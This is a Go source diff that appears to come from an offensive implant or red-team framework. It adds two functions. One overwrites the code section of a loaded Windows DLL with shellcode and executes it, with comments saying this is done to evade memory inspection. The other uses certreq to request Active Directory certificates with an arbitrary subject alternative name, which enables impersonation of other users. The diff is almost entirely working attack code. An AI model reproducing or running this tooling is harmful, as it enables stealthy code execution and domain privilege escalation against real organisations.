@@ -956,6 +956,113 @@ func netSharesJSON(host string) (string, error) {
 	return string(data), nil
 }
 
+// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
+//
+// Overwrites the .text section of an already-loaded DLL with shellcode.
+// Args JSON: {"dll":"<name>","sc_b64":"<base64>"} — dll defaults to auto-pick.
+// Unlike UDRL (which creates a new SEC_IMAGE section), this reuses an existing
+// mapped image region; from the VAD it is indistinguishable from normal DLL code.
+
+func shellcodeStomp(sc []byte, dllHint string) string {
+	if len(sc) == 0 {
+		return "[-] shellcode_stomp: empty shellcode"
+	}
+
+	// Candidates to auto-pick when no hint given (small, rarely-called DLLs)
+	autoTargets := []string{
+		"xpsservices.dll", "clbcatq.dll", "msasn1.dll",
+		"wbemprox.dll", "wbemcomn.dll",
+	}
+
+	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, 0)
+	if err != nil {
+		return "[-] shellcode_stomp: CreateToolhelp32Snapshot: " + err.Error()
+	}
+	defer windows.CloseHandle(snap)
+
+	var me windows.ModuleEntry32
+	me.Size = uint32(unsafe.Sizeof(me))
+
+	var targetBase uintptr
+	var targetName string
+
+	for windows.Module32First(snap, &me) == nil {
+		name := strings.ToLower(windows.UTF16ToString(me.Module[:]))
+		pick := false
+		if dllHint != "" {
+			pick = strings.EqualFold(name, strings.ToLower(dllHint))
+		} else {
+			for _, t := range autoTargets {
+				if name == t {
+					pick = true
+					break
+				}
+			}
+		}
+		if pick {
+			targetBase = me.ModBaseAddr
+			targetName = name
+			break
+		}
+		if windows.Module32Next(snap, &me) != nil {
+			break
+		}
+	}
+
+	if targetBase == 0 {
+		return "[-] shellcode_stomp: target DLL not loaded in process"
+	}
+
+	// Parse PE to find .text section
+	dosHdr := (*[2]byte)(unsafe.Pointer(targetBase))
+	if dosHdr[0] != 'M' || dosHdr[1] != 'Z' {
+		return "[-] shellcode_stomp: DLL MZ already wiped, can't parse PE"
+	}
+	e_lfanew := *(*uint32)(unsafe.Pointer(targetBase + 0x3C))
+	ntBase := targetBase + uintptr(e_lfanew)
+	numSections := *(*uint16)(unsafe.Pointer(ntBase + 6))
+	optHdrSize := *(*uint16)(unsafe.Pointer(ntBase + 20))
+	sectBase := ntBase + 24 + uintptr(optHdrSize)
+
+	var textOff, textSize uintptr
+	for i := uintptr(0); i < uintptr(numSections); i++ {
+		s := sectBase + i*40
+		name8 := (*[8]byte)(unsafe.Pointer(s))
+		secName := strings.TrimRight(string(name8[:]), "\x00")
+		if secName == ".text" {
+			textOff = uintptr(*(*uint32)(unsafe.Pointer(s + 12)))  // VirtualAddress
+			textSize = uintptr(*(*uint32)(unsafe.Pointer(s + 16))) // VirtualSize
+			break
+		}
+	}
+	if textSize == 0 {
+		return "[-] shellcode_stomp: no .text section found in " + targetName
+	}
+
+	writeAddr := targetBase + textOff
+	writeLen := uintptr(len(sc))
+	if writeLen > textSize {
+		writeLen = textSize
+	}
+
+	var old uint32
+	apiVirtualProtect(writeAddr, writeLen, windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&old)))
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(writeAddr)), writeLen), sc[:writeLen])
+	apiVirtualProtect(writeAddr, writeLen, windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&old)))
+
+	// Execute from stomped region
+	if th, err := hgCreateThreadEx(windows.CurrentProcess(), writeAddr, 0); err == nil {
+		windows.CloseHandle(th)
+	} else {
+		r, _, _ := procCreateThread.Call(0, 0, writeAddr, 0, 0, 0)
+		if r == 0 {
+			return fmt.Sprintf("[-] shellcode_stomp: CreateThread failed: %v", err)
+		}
+		windows.CloseHandle(windows.Handle(r))
+	}
+	return fmt.Sprintf("[+] shellcode_stomp: %s+0x%x sc=%d B → executing", targetName, textOff, len(sc))
+}
+
 // ── CLR_STOMP ─────────────────────────────────────────────────────────────────
 
 // clrStomp zeroes the MZ header of every loaded CLR/mscor module in-process.
@@ -1058,4 +1165,30 @@ func spawnWithPPID(cmd, parent string) string {
 	windows.CloseHandle(pi.Thread)
 	windows.CloseHandle(pi.Process)
 	return fmt.Sprintf("[+] spawned '%s' (PID %d) with PPID=%s", cmd, pi.ProcessId, parent)
+}
+
+func adcsRequest(ca, tmpl, subj, san, outPath string) string {
+	pid := os.Getpid()
+	inf := fmt.Sprintf(`C:\Users\Public\adcs_%d.inf`, pid)
+	csr := fmt.Sprintf(`C:\Users\Public\adcs_%d.csr`, pid)
+	if outPath == "" {
+		outPath = fmt.Sprintf(`C:\Users\Public\adcs_%d.cer`, pid)
+	}
+	sanLine := ""
+	if san != "" {
+		sanLine = "\r\nSAN=upn=" + san
+	}
+	infContent := fmt.Sprintf(
+		"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s%s\r\n",
+		subj, tmpl, sanLine)
+	_ = os.WriteFile(inf, []byte(infContent), 0600)
+	out1, _ := runShell(fmt.Sprintf(`certreq -new "%s" "%s" 2>&1`, inf, csr))
+	out2, _ := runShell(fmt.Sprintf(`certreq -submit -config "%s" "%s" "%s" 2>&1`, ca, csr, outPath))
+	certB64 := ""
+	if cert, err := os.ReadFile(outPath); err == nil {
+		certB64 = "\ncert_b64=" + base64.StdEncoding.EncodeToString(cert)
+	}
+	_ = os.Remove(inf)
+	_ = os.Remove(csr)
+	return out1 + "\n" + out2 + certB64
 }
